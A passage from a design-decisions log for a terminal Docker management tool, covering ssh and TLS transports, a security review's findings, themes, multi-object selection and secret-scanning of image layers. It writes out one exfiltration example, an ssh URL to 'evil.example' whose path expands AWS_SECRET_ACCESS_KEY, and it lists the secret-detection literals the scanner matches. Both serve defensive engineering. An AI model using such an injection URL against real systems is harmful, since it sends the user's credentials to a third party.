**Alternative:** `golang.org/x/crypto/ssh` inside the binary — no run-time dependency, and the
same channels.

**Why:** the operator has already told `ssh` how to reach their machines and what to trust:
`~/.ssh/config` (aliases, `ProxyJump`, per-host identities), the agent, `known_hosts`,
certificates, hardware keys. A library would have to re-implement each of those, and a private
re-implementation of host-key checking is the last thing to want in a tool that deletes things
on servers. The Docker CLI made the same choice for the same reason.

**What is taken from the URL is not trusted** — a context file is not always the operator's
own writing. Each part that reaches ssh's command line is held to a short list of characters:
letters, digits, and `. _ : -` in a host, `. _ @ + -` in a user, `. _ / @ + , = -` in a socket
path; a port is digits. A password, a query, a fragment and control characters are refused
outright, and the destination is passed after `--`. This is much narrower than what ssh
accepts, and deliberately so.

The first version refused only what I knew to be dangerous: a leading `-`, and `:` and `\` in
the path. The review (R13) found what I did not know: **ssh expands `${VAR}` and `%`-tokens in
the paths of a forwarding**. A context whose host was `ssh://evil.example/${AWS_SECRET_ACCESS_KEY}`
— or the same percent-encoded, so that it did not look like one — made ssh send that
variable's value to the server it named. A list of what is known to be safe does not depend on
knowing every such feature. A user name or path that needs other characters belongs in
`~/.ssh/config` under a host alias, where the operator wrote it.

**Cost:** "needs nothing else at run time" now has an exception — `ssh://` endpoints need an
OpenSSH client. Unix and TCP endpoints still need nothing.

### R4 — ssh asks its questions before the desk opens, and never after

**Decided:** the tunnel is opened while the terminal is still the operator's ordinary screen.
If ssh needs a passphrase, a password or a decision about an unknown host key, it asks — itself,
on the terminal — and the desk opens when the tunnel is up. Once the desk owns the terminal,
ssh is only ever run with `BatchMode=yes`: a reconnection that would need an answer fails
instead of asking. The same when the program is not started from a terminal (`--check` in a
script). What ssh says on stderr is shown until the tunnel is up and kept, not shown,
afterwards.

**Why:** a prompt written underneath a full-screen program is invisible, and a key typed for
the desk would be read as part of a passphrase. The CLI's per-connection way cannot offer an
interactive login to a full-screen program at all; this is the other half of why R2 went the
way it did.

**`BatchMode` is not enough, and the first version relied on it.** Found by the review, which
reproduced it end to end: when the host is reached through a jump host (`ProxyJump`), ssh
starts a second ssh for the jump — and does not pass `BatchMode` on to it. After a dropped
link that second ssh asked for its passphrase on the terminal the desk was drawn on, and the
`q` typed next went to the prompt instead of the desk. So a run that must not ask is now also
started **without a controlling terminal** (in a session of its own): neither it nor anything
it starts — a jump host's ssh, a `ProxyCommand` — has a terminal to ask on. And with
`SSH_ASKPASS_REQUIRE=never`, so that it does not put up a graphical prompt instead.
`TestJumpHostNeverAsksUnderTheDesk` is the review's scenario; it fails with the detached
session taken out.

**Cost:** a login that needs a typed answer cannot be repeated after the link drops. The desk
stays open and says so — `The ssh link to … is down — retrying: … Permission denied` — and has
to be restarted to log in again. An agent removes the limit. Handing the terminal back to ssh
from inside the desk, the way the shell is handed it (D16), would remove it for everyone and
was left as an open question rather than built unasked.

### R5 — The tunnel belongs to the desk: its own connection, supervised, private, cleaned up

**Decided, each for a failure it prevents:**

- `ControlMaster=no`, `ControlPath=none` — the tunnel never joins a connection the operator
  shares between sessions. A forwarding added to that would stay behind after the desk quits.
- `ServerAliveInterval=10`, `ServerAliveCountMax=3` — a dead link is noticed in about half a
  minute, ssh exits, and a supervisor starts it again: pause of 1 s growing to 15 s, each
  attempt bounded to 30 s, until the desk quits.
- A fresh `0700` directory, and `StreamLocalBindMask=0177` for a `0600` socket — whoever can
  connect to the local socket controls the remote daemon, with the remote user's rights.
- `StreamLocalBindUnlink=yes` and the same path on every restart — the client keeps dialling
  one address. (Found by trying: ssh leaves its socket file behind when it is terminated.)
- On quit, on a failed launch, on Ctrl+C during launch, and on a hang-up at any time — the
  terminal window being closed, which is an ordinary way to leave — ssh is ended and the
  directory removed. (The hang-up was added after the review found the socket left behind.)
- `ForkAfterAuthentication=no` — an ssh that the operator's configuration sends to the
  background after logging in looked, to the desk, like one that had exited without a word;
  the launch failed and the ssh that had gone to the background stayed, tunnel and all (found
  by the review). The option is newer than everything else on the command line (OpenSSH 8.7):
  a client that rejects it is run again without it, and an ssh that exits with status 0 before
  the tunnel is up is reported as having gone to the background, not as an unexplained exit.
- On Linux, ssh is also ended if the desk dies without the chance to clean up (`kill -9`): the
  kernel's "parent death" signal. It is tied to the *thread* that started the child, so ssh is
  started, and waited for, on a thread that lives exactly as long as it does.

**Deliberately not set:** `ExitOnForwardFailure`. It would make ssh exit when *any* forwarding
fails — including one from the operator's own `~/.ssh/config` whose port is busy because they
have a session open to that host. The desk's forwarding binds a path nobody else has; if ssh
reports that it could not, the launch fails at once with ssh's words.

**Cost:** on macOS a desk killed outright leaves its ssh running until the link drops; its
socket is private. After `kill -9` or `SIGQUIT`, on any system, the empty directory and the
dead socket stay in the temporary directory: nothing sweeps them.

### R6 — TCP and TLS follow the Docker CLI's rules; plain TCP is allowed, and labelled

**Decided:** TLS is used exactly when the CLI would use it, with the same material:

| Endpoint named by | TLS when | Verified | Material |
| --- | --- | --- | --- |
| `--host`, `DOCKER_HOST` | `DOCKER_TLS_VERIFY` or `DOCKER_TLS` is non-empty | only with `DOCKER_TLS_VERIFY` | `ca.pem`, and `cert.pem`+`key.pem` if both exist, in `DOCKER_CERT_PATH` or the config directory |
| a named context | it stores TLS files, or sets `SkipTLSVerify` | unless `SkipTLSVerify` | `contexts/tls/<id>/docker/` — the environment is ignored |

Verifying without a `ca.pem` is an error at launch, as in the CLI, rather than a silent
fall-back to the system's authorities. TLS files are read once, at launch, so that a bad
certificate is a launch error naming the file.

**Three rules I had wrong, found by the review and each confirmed by running the `docker` CLI
against a closed port:**

- *A port not given means 2375 — with TLS too.* I had assumed the conventional 2376 for TLS.
  The CLI does not guess, and a desk that dials another port than `docker` is looking at a
  different daemon. The port in use is now shown by `--check` and in the help.
- *The "default" context is not "the local socket".* It is `DOCKER_HOST` when that is set — so
  `--context default` does not get past `DOCKER_HOST` — and, when `DOCKER_TLS_VERIFY` or
  `DOCKER_TLS` is set and no host is named anywhere, `tcp://localhost:2376`. That last rule is
  odd; it is still where `docker` goes.
- *A context that stores any TLS file is a TLS context.* With only half a client key pair in
  the store I returned "no TLS" — plain TCP where TLS was asked for, the worst possible
  reading. The CLI uses TLS without a client certificate; so does the desk.

Plain TCP connects. It is labelled `tcp, NO TLS`, and unverified TLS `tls, UNVERIFIED`, in the
colour of danger, everywhere the daemon is named.

**Alternative:** refuse plain TCP, or require a flag for it. Rejected as in R1: the CLI allows
it, it is how daemons are reached across a VPN or a relay, and the desk's job is to make the
operator aware, not to decide for them.

**Cost:** an unencrypted, unauthenticated daemon is one variable away. It says so in capitals.

### R7 — `--host` and `--context`, with the CLI's precedence

**Decided:** `-H`/`--host URL` and `-c`/`--context NAME`. Precedence is the CLI's: `--context`,
`--host`, `DOCKER_HOST`, `DOCKER_CONTEXT`, the configured context, the default socket; both
flags together are refused. A host named by flag takes its TLS from the environment, like
`DOCKER_HOST`. The header, `--check` and the help say which of them chose the daemon.

**Why:** reaching a remote daemon should not require exporting a variable into the shell —
where it then silently applies to every `docker` command typed afterwards. A flag is scoped to
the one program it is given to.

**Not added:** `--tlsverify`, `--tlscacert` and the rest. The variables and the context store
cover it, and six more flags to keep in step with the CLI's is six more places to diverge.

### R8 — A remote failure is explained for what it is

**Decided:** each transport's failures are named, before the workspace opens.

- **TCP.** The port is dialled once before the client library is used. *Found:* the library
  reports every failure to connect with one sentence ("Cannot connect to the Docker daemon…")
  and hides the cause from `errors.Is`, so a refused port, a name that does not resolve and a
  firewall that drops packets all read alike. The direct dial is skipped when the environment
  routes the address through a proxy, since a direct connection proves nothing about that path.
- **TLS.** TLS towards a port that does not speak it; a port that expects TLS with none
  configured; a certificate from another authority; a certificate not valid for the name; a
  client certificate missing, or refused.
- **SSH, before the tunnel is up.** ssh's own last lines, without its notices, and a hint for
  the two common cases (cannot log in; host key unknown or changed).
- **SSH, tunnel up but the socket unreachable.** *Found:* the ssh client reports every such
  failure with the same words — `open failed: connect failed: open failed` — whether the
  socket is missing, forbidden, or the server refuses to forward. So the remote machine is
  asked, over a second, non-interactive connection, with a one-line `sh -c 'test …'`: no socket
  there, not a socket, or not permitted. If the socket is there and may be opened, two causes
  remain that cannot be told apart from either end — nothing is listening on it, or the server
  forbids forwarding — and the message names both. If the question cannot be asked at all (the
  login needed a typed answer, or the server runs no commands), every possibility is listed.

- **SSH, tunnel up, no answer in time.** Said as exactly that. *Found by the review:* a daemon
  that accepted the connection and then said nothing was handed to the probe above and came
  back as "the SSH server could not connect to it" — with a hint about `sshd_config`. The
  server had connected. Silence is not a refusal.
- **A socket in a directory the remote user may not enter** (another user's rootless daemon)
  is "you may not look inside that directory", not "there is no socket — is Docker running?"
  *(review)*.
- **A local socket that ssh could not create** says "Permission denied" as well, and got the
  hint for a failed login *(review)*. Hints are matched most specific first.
- **A certificate file that cannot be used** is the client's own set-up failing; it is no
  longer reported under "the daemon is not reachable" *(review)*.
- **TLS hints say where TLS came from.** For a named context they no longer suggest changing
  environment variables the context ignores *(review)*.
- **Messages name the daemon, not the tunnel.** The client library quotes the address it
  dialled, which for SSH is a socket in a temporary directory; the list pane read "failed to
  connect to the docker API at unix:///tmp/docker-desk-ssh-…" *(review)*. Error text is
  rewritten to the endpoint the operator knows. The hint for trying ssh by hand repeats the
  command that was actually run, `DOCKER_DESK_SSH` included.

**Why not always list every possibility:** "is Docker running, or are you not in the group, or
is forwarding forbidden" sends the operator to three places. One true sentence sends them to
one. But a guess presented as a finding is worse than a list, hence the two fall-backs.

**Cost:** one more connection on the failure path of an SSH launch, and a few string matches on
error text from the TLS library, which a future Go version could reword (the tests would say).

### R9 — The test guard covers the new ways in

**Decided:** under the guard (B3) a read-write engine may be opened only on a unix socket
under the temporary directory, or on a TCP address that the fake engine itself is listening on
(it registers the address when it opens the listener — a TCP address has no directory to tell
a fake by). An SSH tunnel may be opened only to a remote socket under the temporary directory.
The switch moved into its own package, `internal/testguard`, because two layers now obey it.

**Why the tunnel needs its own check:** the tunnel's local end is *always* a socket under the
temporary directory. Without a check on the far end, tunnelling would have been a way to make
the engine's guard say yes to a real daemon.

### R10 — What counts as proof, for transports

**Decided:** the same layering as D22, with real protocol implementations wherever one exists
on the machine, and the fake daemon always at the far end:

- the client library over plain TCP and over mutual TLS, including the hijacked exec, which it
  dials by a different code path;
- the tunnel's supervisor against a stand-in for ssh — the test binary itself, taking ssh's
  command line and failing the ways ssh fails — so that every path runs everywhere;
- the same tunnel with the **real ssh client and a real `sshd`**: the suite starts an
  unprivileged `sshd` on a loopback port with throwaway keys (`internal/sshtest`), and skips
  those tests where OpenSSH's server is not installed;
- the launch sequence in process, for every transport and every failure;
- the **real `docker` CLI** writing a context with certificates and using it, before the desk
  is asked to (the check on D4/R6);
- the real binary on a pseudo-terminal over TCP, TLS and SSH — a passphrase typed before the
  desk opens, the link dropping and coming back, Ctrl+C while ssh connects, the desk killed.

**Alternative for SSH:** only the stand-in. Much less machinery — and it would have encoded my
understanding of OpenSSH, which was wrong in four places (see the journal, §14).

**Cost, stated plainly:** all of it runs on one machine. No packet left it; no daemon on
another computer was ever contacted; password logins were not exercised (an unprivileged
`sshd` cannot check passwords — a key with a passphrase stands in for "ssh has a question").
See [TESTING.md](TESTING.md).

### R11 — Nothing that identifies the daemon is ever cut off

**Found** by the first end-to-end run over SSH. The endpoint named its socket and was long;
the dialog's "daemon" line was a single line fitted to the dialog's width — and what fell off
the right-hand end was the context and the `[ssh]` tag. The header had the same shape of
fault: when nothing else could be dropped, the whole line was truncated at the right, where
the connection state and the tags are.

**Decided:** in a dialog the endpoint, the context and the tag each go beside what is already
there when they fit and onto a line of their own when they do not, and one that is longer than
a line is continued on the next. In the header, when nothing else is left to drop — the
engine's name and version, the title, "— retrying" — it is the *middle* of the endpoint that
gives way: its beginning says which machine and its end which socket.

**Corrected after the review**, which found the first fix incomplete in three ways: a long
*context name* still pushed the tag off the dialog line (`[REMOTE tls, U…`); the header cut
the endpoint's *end*, so that two rootless daemons on one host (`…/1000/docker.sock`,
`…/1001/docker.sock`) looked the same; and the tests only checked a short endpoint in the
connected state. The tests now use the review's own examples, connected and disconnected.

**Why it matters more than a cosmetic fault:** R1 rests entirely on that tag being read.

### R12 — "Remote" is decided by the address

**Decided:** `localhost` and loopback addresses are not called remote — the tag then names
only the transport (`[ssh]`, `[tcp, NO TLS]`). Every other address is.

**Cost:** a name that merely resolves to this machine is called remote. The tag errs towards
caution, and the header also shows the engine's own host name.

### R13 — An independent review of the new ways in

**Decided:** as in round one (B30), before calling it done the new code — resolution, the
tunnel, TLS, the launch sequence, and what the desk shows about the daemon — was handed to a
separate reviewer with ten rules it must obey and no account of why I believed it did. It was
asked for concrete inputs and sequences that break a rule, and it ran them: against the fake
daemon, a throwaway sshd, and the `docker` CLI pointed at listeners of its own. It did not
touch the repository or the real daemon.

**Why:** the same reason as before, and sharper. The tests I had written proved that what I
had thought of worked. The two most serious findings are things I did not know about OpenSSH;
no test of mine could have contained them.

**What came back, and what was done:**

| Finding | Outcome |
| --- | --- |
| The ssh started for a **jump host** asks for its passphrase underneath the running desk after a reconnect, and reads the operator's keys | fixed — R4: a non-interactive ssh has no controlling terminal |
| ssh **expands `${VAR}` and `%`-tokens** in the socket path from a URL or context: environment variables are sent to the server named there, and the path shown is not the path used | fixed — R3: a list of permitted characters for every part of the destination, and for the local path |
| Confirmations **do not fit 80×24**; the prompt and the input can be off screen | fixed — R14 |
| The daemon's identity is **cut off at 80 columns**: the endpoint's end in the header, the tag behind a long context name in a dialog | fixed — R11 |
| Over TLS, **opening a shell can hang for ever**: the library dials that connection without a context | fixed: the attach is bounded by its context in the engine layer, and the TLS transport has a handshake timeout |
| **`--context default` ignores `DOCKER_HOST`**; the CLI does not. Without a host, the TLS variables mean `tcp://localhost:2376` | fixed — R6 |
| **Explanations that blame the wrong cause** (five of them) | fixed — R8 |
| With **`ForkAfterAuthentication`**, the launch fails and an authenticated tunnel is left running | fixed — R5 |
| The socket and its directory are **left behind after a hang-up** | fixed for the hang-up — R5; `kill -9` and `SIGQUIT` kept, as a stated cost |
| **Error text names the tunnel's local socket** as the daemon | fixed — R8 |
| A context storing **half a key pair is opened without TLS** | fixed — R6 |
| The **default port differs from the CLI's** when TLS is on, and is shown nowhere | fixed — R6 |
| **Control characters** from a percent-encoded URL are written to the terminal | fixed: refused when the endpoint is resolved, and by the character lists of R3 |
| **Shell metacharacters in a host** are accepted (a current ssh refuses them itself; an older one with `ProxyCommand %h` would not) | fixed — R3 |
| **Tests that cannot fail**: the Ctrl+C test passes without the code it tests; a leftover check only logs; a broken sshd helper turns every real-SSH test into a skip; a launch that forgets its endpoint would find the operator's real context | fixed: the stand-in ignores the terminal's interrupt; the check asserts, in a temporary directory of its own; `DOCKER_DESK_REQUIRE_SSHD=1` turns those skips into failures; the pseudo-terminal harness starts every program with an endpoint that cannot exist and no Docker configuration; the guard's idea of "the temporary directory" is fixed when the tests start |
| Minor: a stale "open failed" line reported as why the link fell; `T` replacing the "dropped the pending action" notice; a relative `./.docker` when `HOME` is unset | fixed |
| Loopback addresses are not called remote even when they are a port-forward to another machine | kept (R12): the address is all there is to go by; the header also shows the engine's own host name |
| Through a proxy, the shell's connection goes direct | kept, and stated in the README: it is the client library's behaviour, and the Docker CLI's |

Each fix has a test that replays the reviewer's input or sequence. For four of them — the two
most serious among them — the test was run with the fix taken out and seen to fail
([TESTING.md](TESTING.md#do-these-tests-have-teeth)).

It also recorded what it examined and could not break: option injection through the host,
user and port; the socket's permissions; the supervisor's states (no deadlock or leak apart
from the one above); that only the first ssh may ask; the TLS rules, including that a CA is
never ignored and that the name in a certificate is checked; the precedence apart from the one
above; that `T` cannot confirm anything; the in-process guard; that every launch failure exits
before the alternate screen.

And what it did not examine: the palettes and their contrast; macOS; OpenSSH versions other
than 9.6; password logins; the README and this file.

### R14 — A confirmation always fits the terminal

**Found** by the review: at 80×24 some confirmations were taller than the screen. The key
hints — and for "prune images, all unused" the prompt and the input line themselves — were
drawn below the last row. One dialog did this before round two; the extra "daemon" lines of a
long remote endpoint pushed two more over.

**Decided:** a confirmation has three parts. What is acted on and on which daemon, at the top,
and how to proceed — the refusal, or the prompt, the input and the keys — at the bottom, are
never scrolled and never cut. What lies between — the effects, the warnings and, for a set, the
exact objects — takes the room that is left. Usually that is everything but a long list, which
scrolls on its own as before. When even that does not fit, the whole middle scrolls as one, and
says so ("lines 4–9 of 31 · … scroll — read all of it").

**Alternative:** refuse to confirm when the dialog does not fit, in the spirit of B27 (nothing
is acted on that is not on screen). Simpler — and it would have made the largest prunes
impossible at the minimum size the desk claims to support.

**Why this and not that:** B27 is about acting on what cannot be *seen*. Here everything can
be — by scrolling, with the input in view the whole time. What must never happen is typing a
confirmation into a line that is off screen, and that is now impossible by construction; a
test opens every kind of confirmation at 80×24, on a local and on a long remote endpoint,
types into it, and scrolls to every listed object.

**Cost:** on a small terminal the effects and warnings of a long confirmation are not all
visible at once. And this changes a round-one dialog, which is more than was asked for; it was
done because the review showed the input line off screen.

### T1 — A theme is a palette of meanings, and can change nothing else

**Decided:** a theme is seven colours — accent, dim, good, warn, bad, unfocused border,
unfocused title — and an optional pair for the highlighted row. One function builds every
style from them. Weight, underline and reverse video are the same in every theme; layout,
glyphs and wording are out of a theme's reach.

**Alternatives:**

- *Per-element styling* (a colour for every pane, column and state). More to choose from, and a
  theme that could make "refused" look like "succeeded".
- *Theme files.* The first round listed themes and configuration files as non-goals; themes
  were now asked for, files were not. A palette that can be edited freely is also one where red
  need not mean danger, and the desk has no configuration file to put one in.

**Why:** the desk's colours carry meaning — red is "this deletes" and "this failed". Fixing
*what the colours mean* and letting a theme choose only *which colours* keeps that true in
every theme. `TestAThemeChangesColourAndNothingElse` draws every kind, in two layouts, plus a
refused deletion, in every theme and compares the text cell for cell.

### T2 — The default look does not change

**Decided:** `dark` is the original palette, value for value, pinned by a test. With no theme
setting the desk uses `dark`, or `light` when the terminal reports a light background.

**Why `light` at all, by default:** it is the one case where the original palette was wrong —
light grey titles on white. Everywhere else, nobody who did not ask for a theme sees a
difference.

### T3 — `--theme`, `DOCKER_DESK_THEME`, and `T`; nothing is saved

**Decided:** a flag, a variable, and a key that switches to the next theme in the running
desk. The status line then names the theme and both ways of keeping it. An unknown name is an
error that lists the known ones.

**Alternatives:** *remember the last theme* — needs a configuration file, the desk's first; not
worth it for one setting, and left as an open question. *Fall back to the default on an unknown
name* — a typo would then look like "themes do not work".

**Why a key as well:** nobody chooses a palette from its name. `T` is upper-case like the
other keys that are not everyday navigation, and it is not an action: it is handled after
dialogs and the filter have had the key, sends nothing, and — like any key — drops a
confirmation that is still being prepared (B26), keeping that notice on the status line rather
than replacing it with the theme's name.

### T4 — Themes are checked for contrast, and never paint the background

**Decided:** the desk does not set a background colour. A named palette is meant for a
terminal already using that scheme, and each of its text colours is tested at ≥ 3:1 against
that scheme's background; the highlighted row's text at ≥ 4.5:1 against the highlight.

**Changed because of the test:** Dracula's comment colour (3.0:1) is too faint for hints that
are read all the time — a lighter tone of the same hue is used; Solarized's green and yellow on
its light background (2.97:1) were darkened; unfocused borders in four palettes were raised
from 1.6–1.8:1 to above 2:1; Solarized's own selection background differed from the page by
1.15:1 and was replaced by a stronger tone from the same palette. So three of the palettes are
not the canonical ones to the last digit. Legibility won.

**Why not paint the background:** a desk that repaints the whole terminal fights transparency,
background images and the terminal's own theme, and every unpainted cell (padding, an overlay's
edge) shows as a hole.

### T5 — No colour still means no colour

**Decided:** `NO_COLOR`, or a terminal without colour, wins over any theme: no colour sequence
is emitted and every theme draws the same frame. `mono` is the same by choice. `T` then says
so, rather than appear to do nothing.

**Found while testing this:** without colour the renderer emits no attributes at all — not
bold, not reverse video. I had written that reverse video is what keeps the highlighted row
visible without colour; it is not. The `▸` glyph is, exactly as the first round designed
("selection adds a cursor glyph"). The comment was corrected and the test asserts the glyph.

## Round three — acting on a selection

The request: add multi-object selection to the List pane. The planner was already
multi-object (prunes and compose projects are sets); only the UI acted on one object. Fixed
by the request: no `engine.Engine` signature changes, no new dependency, no force flag, no
Docker prune endpoints, and `plan.Execute` unchanged. Where the request left a choice open,
the choice is recorded here.

### S1 — A selection is one plan, built by the single-object constructors

**Decided:** `plan.Set(op, snapshot, members)` plans every selected object with the very
constructor a single object would get (`plan.Container`, `plan.ImageRemove`,
`plan.VolumeRemove`, `plan.NetworkRemove`), from one fresh snapshot, and concatenates their
steps into one `Listed` plan. The dialog renders it and `plan.Execute` sends it, unchanged.

**Alternative:** one job per object, or a loop of single-object dialogs.

**Why:** a second set of rules for "many" would drift from the rules for "one". Reusing the
constructors means a set can never include anything a single confirmation would refuse, and
the D11 property — the dialog shows exactly what the job sends — holds for a set by
construction. One plan is also one confirmation and one job with `i/n` progress.

### S2 — What cannot be included is named, not a reason to refuse the set

**Decided:** a member whose constructor returns `NotApplicable` (already running, vanished…)
or a plan with blockers (in use, running, predefined) is left out and recorded in the new
`Plan.Skipped` with that reason. The dialog shows it under **Not included**. The remaining
members still run. Only when nothing remains is the plan not runnable, and then it says
"Nothing to do" and lists every reason.

**Alternative:** refuse the whole set if any member is blocked (as "remove project" does).

**Why:** the request says so, and a selection made with `a` over a filter routinely contains
a few objects in use; making the operator hunt them down one by one invites unselecting the
wrong ones. Nothing is silent: each left-out object is named with the planner's reason, in
the dialog, before anything is sent. "Remove project" keeps refusing: there the project is
the object.

**Cost:** a confirmation can act on fewer objects than were selected. The headline counts
what will be acted on ("Exactly these 2 will be stopped"), the ident line says "2 containers
· 1 not included", and the typed word carries the smaller number.

### S3 — Every set confirmation is typed, with the count in the word

**Decided:** a set plan is always `TierTyped`, and its word is the verb and the number of
requests: `stop 3`, `remove 7`. The prompt reads "Type remove 7 to confirm, then press
Enter". A single object keeps its own tier and wording.

**Alternative:** keep D12's tiers — `y` for reversible actions, the bare word for deletions.

**Why:** "a set confirmation types the count" was asked for, and it is right for reversible
actions too: one keystroke must not stop thirty containers, and the number is the thing the
operator has to have read. The count is of requests, which is also the number in the
headline, so what is typed matches what is listed. Matching is exact; `stop  2`, `STOP 2` and
`stop 3` are refused with "Nothing was sent".

**Cost:** stopping two containers takes more typing than stopping one.

### S4 — Selecting every reference of an image deletes the image

**Decided:** image rows are grouped by image. When the selection holds every reference of a
multi-tag image, it is planned the way `ImagePrune` plans it: one untag per reference, the
last of which carries the size and the in-use re-check (`MustBeUnused`) and deletes the
image. If anything uses the image, every one of those rows is left out with that reason.
A selection holding only some references plans each as the single-object untag ("untag
only" in the list).

**Why:** planned one by one, each reference is an untag that *promises to keep the data*
(B16, B28). After the first, the second reference has become the last, and `Execute` would
correctly refuse it — the operator who selected both tags of an image would get a failed job
and an image still there. The rule follows what selecting every name of an image means.

### S5 — Keys: Space, `a`, and Esc one step at a time

**Decided:** in the List pane `Space` toggles the highlighted row and does not move the
highlight; `a` adds every row the filter shows; `Esc` clears the selection, then the filter,
then moves focus to Kinds. `Space` keeps paging in Details and Events. Compose projects
cannot be selected: each is already a set, acted on as a whole. Marking is allowed in
read-only mode; acting is not.

**Why:** `Space` is the conventional mark key, and moving after toggling would make the
highlight — which the Details pane follows — jump on its own. `a` was free in every kind.
The Esc ladder undoes the most recent kind of narrowing first, so the selection, which is
what an action key would now apply to, is never left behind by accident.

### S6 — Single-object actions, and prune, refuse a selection

**Decided:** with a selection, `e` shell, `c` connect and `D` disconnect show why they refuse
("works on one object at a time and 3 are selected: Esc clears the selection. Nothing was
sent.") and send nothing. `X` prune refuses as well; `P` pull and `n` new ignore the
selection. The action menu, opened on a selection, offers only what applies to it and is
titled "Actions: 3 selected". Actions pressed in the Details pane apply to the selection too.

**Alternative:** let these act on the highlighted row, ignoring the selection.

**Why:** with a selection visible, an action key that quietly falls back to the highlighted
row would act on an object the operator did not mean. Prune chooses its own objects; pressing
it while a selection is shown is most likely the mistaken belief that it removes the
selection.

### S7 — The selection is keyed by identity, includes what the filter hides, and is used up

**Decided:** a mark is stored under the row's key — container ID, image ID and reference,
volume name, network ID — with the row it was taken from. Each list rebuild refreshes it and
drops marks whose objects are gone (only once the list has loaded: a failed refresh drops
nothing). Marked rows the filter hides stay selected and are listed in the confirmation. The
selection of a kind is cleared when the job confirmed from it starts, and kept when the
dialog is declined.

**Why:** the same identity rule as the highlight (the object, not the position). Keeping
hidden marks follows from the selection being what was marked, not what is on screen; the
confirmation lists every one, which is the safeguard. Clearing on start means the next action
key means the highlighted row again, instead of re-applying to objects that were just
removed or stopped.

### S8 — The fake daemon's log generator no longer panics on a backwards tick

**Found while testing this change:** under load the whole suite once panicked in the fake
daemon (`makeslice: len out of range`): a ticker value earlier than the previously read clock
made the elapsed time negative. The generator now clamps it to zero. Test double only; no
product code was involved.

## Round four — image findings

The request: a third tab on Images that reads the image's own archive — every layer, every
file — and reports what is inside it, joined with what the daemon runs from it now. Fixed by
the request: GET requests only, read-only mode unchanged, stream and never write to disk,
bound every buffer, no severity score, never guess, no new dependency, and the existing
safety, layout, remote and theme tests untouched. Where it left a choice open, the choice is
recorded here.

### F1 — The archive comes from the client library's `ImageSave`, which is `GET /images/get?names=…`

**Decided:** `engine.SaveImage(ctx, id, platform)` calls the library's `ImageSave` with one
image ID and `ImageSaveWithPlatforms`. On the wire that is `GET /images/get?names={id}&platform={json}`.

**Alternative:** the request named `GET /images/{id}/get`, which the library has no method for;
sending it would mean hand-rolling HTTP beside the library.

**Why:** D3 — every request goes through Docker's client library, so the read-only request
hook, API-version negotiation and error classification apply to this one too. The daemon
serves both paths from the same handler (`getImagesGet`), with the same `platform` parameter.
The library refuses to send `platform` to a daemon older than API 1.48, so the desk leaves it
out there (such a daemon has one variant per image ID to give). The fake daemon serves both
paths, so either would be tested.

**Cost:** `github.com/opencontainers/image-spec` (for the platform type) moved from an
indirect to a direct requirement in `go.mod`. It was already in the module graph and `go.sum`
is unchanged: no new dependency.

### F2 — `SaveImage` is a read method of `Engine`

**Decided:** it is in the interface beside the inspect methods, passes through the read-only
wrapper untouched, and is listed among the read methods of `TestReadOnlyCoversEveryMutation`
(which still counts 18 mutating methods). `TestReadOnlyExportsAnImage` exports and analyses an
image through a read-only engine and finds no mutating request at the fake daemon; the UI and
end-to-end tests do the same with `--read-only`.

**Why:** export reads the image store and writes nothing. It is the only way to see the bytes
of a layer without running a container (which would be a mutation).

### F3 — Layers are recognised by their bytes, because manifest.json may come last

**Decided:** the outer tar is read once, front to back. Each entry is classified by its first
bytes: gzip or zstd magic, or a tar header, is a layer and is walked as it streams past; JSON
is kept whole if it is at most 4 MiB (16 MiB in all); anything else is skipped. Symlinked
layer files (the classic layout stores an identical layer once) are resolved. Only after the
stream ends are `manifest.json`, the config and `index.json` read and the layers put in order.

**Alternative:** buffer or spool the archive until the manifest is known.

**Why:** the daemon writes the blobs first and `manifest.json` near the end, and "never write
to disk" rules out spooling. Classifying by content needs nothing but the bytes in hand. What
each layer contributes is kept in a compact form (below) so that cross-layer rules can run at
the end. The fixture tests feed both layouts, with the manifest first and last.

**Cost:** a JSON document larger than the bound is not read (an SBOM can be): it is still
known to be there, and its finding says so.

### F4 — What is kept per layer, and the bounds

**Decided:** for each layer: its digest and diff ID (hashed while streaming; the diff ID is
checked against the config), stored size, content size, file and directory counts, whiteouts,
opaque directories, an 8-byte fingerprint of every path it adds, its symlinks, and
observations (secret matches, special modes, ELF facts, cache and junk aggregates). Bounds
(`forensics.DefaultLimits`): 64 KiB of each file searched for secrets (files over 2 MiB only
when their name suggests a secret), 1 MiB of an ELF file for its headers and 64 KiB after
Go's build-info marker, two million path fingerprints, 50,000 symlinks, 300 observations of a
kind per layer, 25 findings per rule and layer (the rest counted in one "N more" finding),
3,000 findings, 512 bytes of a secret's value. Two buffers (64 KiB and 1 MiB) are reused for
every file. A secret pattern's regular expression runs only where one of its literals occurs
(`AKIA`, `ghp_`, `PRIVATE KEY`, `password`…), and the keyword patterns only on the lines
holding one; all literals are found in a single pass over the block.

**Why:** the archive can be gigabytes; what the rules need from it is small. Running every
expression over every file was 93% of the analysis's time in the first profile; with the
literal pass, `BenchmarkAnalyse` (2,000 plain-text files) reads about 125 MB/s on this 4-core
machine under load, a third of it spent hashing for the diff-ID check. Every bound that
cuts something off says so: in a note on the report ("layer 3 has more paths than the desk
keeps…"), or by a rule declining to conclude. The command-exists check, for one, does not run
unless every layer was read and fingerprinted whole.

### F5 — manifest.json first, index.json for what it omits

**Decided:** `manifest.json` gives the config and the ordered layers. When it lists several
images, the entry whose config digest matches the image ID, or whose tags include the
reference, is read; otherwise the first, with a note. `index.json` is walked only for
attestation manifests and for platforms whose blobs are absent. A nested index that references
blobs not in the archive is skipped, never fatal. If there is no `manifest.json` at all, the
config and layers are found through `index.json` for the requested platform, with a note.

**Why:** that is the request's rule. The last case is not in it: an OCI layout written by a
tool other than the daemon may lack `manifest.json`, and "index.json for what manifest.json
omits" covers "everything". `TestIndexOnlyArchive` proves the path.

### F6 — A finding, and the three sources

**Decided:** a finding carries a rule ID (`secret.deleted`), a group, a source, a certainty, a
layer (0 for config, archive-wide and live findings), a path, masked evidence, a one-line
reason, the build instruction when it maps, what the evidence cannot tell, and for Go programs
the module list. Sources: **image** — the archive's bytes; **daemon** — the daemon's own
answers (container flags, the reference a container was created from, repository digests);
**desk** — a join of the two that neither says alone (a privileged container of an image with
no USER; a tag that has moved). There is no severity score.

Certainty: **certain** when the evidence is the fact — a mode bit, a config field, a byte
structure in an exact format (a PEM private key header, an `AKIA…` key ID, a GitHub token);
**likely** when it fits but has an innocent reading (`DB_PASSWORD=…` in a `.env`; a bare shell
as the command; no stack-protector symbol); **hint** when circumstantial (a file named
`id_rsa` with no key in it; no attestation in a classic archive).

**Why:** the request. Certainty says how much the evidence supports the claim; the "unknown"
line says what it does not support — "whether the value is a live credential", "whether the
runtime's capability bounding set lets them through". Both are needed to act on a finding
